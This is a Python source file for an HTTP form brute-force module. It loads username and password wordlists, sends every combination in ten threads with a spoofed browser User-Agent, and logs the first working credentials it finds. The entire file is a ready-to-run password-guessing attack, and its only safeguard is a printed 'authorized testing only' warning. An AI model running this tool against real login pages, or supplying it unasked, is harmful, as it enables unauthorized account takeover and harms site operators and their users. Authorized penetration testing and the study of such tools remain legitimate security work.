#!/usr/bin/env python3
"""HTTP Form Brute Force Module"""
import requests
import threading
from queue import Queue

class HTTPBrute:
    def __init__(self, url, users, wordlist, user_field, pass_field, fail_str, logger):
        self.url = url
        self.users = self._load(users)
        self.passwords = self._load(wordlist)
        self.user_field = user_field
        self.pass_field = pass_field
        self.fail_str = fail_str
        self.logger = logger
        self.found = []
        self.stop = threading.Event()
        self.queue = Queue()

    def _load(self, path_or_value):
        try:
            with open(path_or_value) as f:
                return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            return [path_or_value]

    def _try(self, user, password):
        if self.stop.is_set():
            return False
        try:
            r = requests.post(self.url,
                data={self.user_field: user, self.pass_field: password},
                headers={"User-Agent": "Mozilla/5.0"},
                allow_redirects=True, timeout=10)
            if self.fail_str not in r.text:
                return True
        except Exception as e:
            self.logger.debug(f"HTTP error: {e}")
        return False

    def _worker(self):
        while not self.queue.empty() and not self.stop.is_set():
            user, pwd = self.queue.get()
            self.logger.info(f"Trying {user}:{pwd}")
            if self._try(user, pwd):
                self.logger.success(f"[FOUND] {user}:{pwd}")
                self.found.append({"user": user, "password": pwd})
                self.stop.set()
            self.queue.task_done()

    def run(self):
        self.logger.info(f"[*] HTTP BruteForce -> {self.url}")
        self.logger.warning("[!] For authorized testing only!")
        for user in self.users:
            for pwd in self.passwords:
                self.queue.put((user, pwd))
        self.logger.info(f"[*] {self.queue.qsize()} combinations...")

        threads = [threading.Thread(target=self._worker) for _ in range(10)]
        for t in threads: t.daemon = True; t.start()
        self.queue.join()

        if not self.found:
            self.logger.warning("[-] No credentials found")
        return self.found
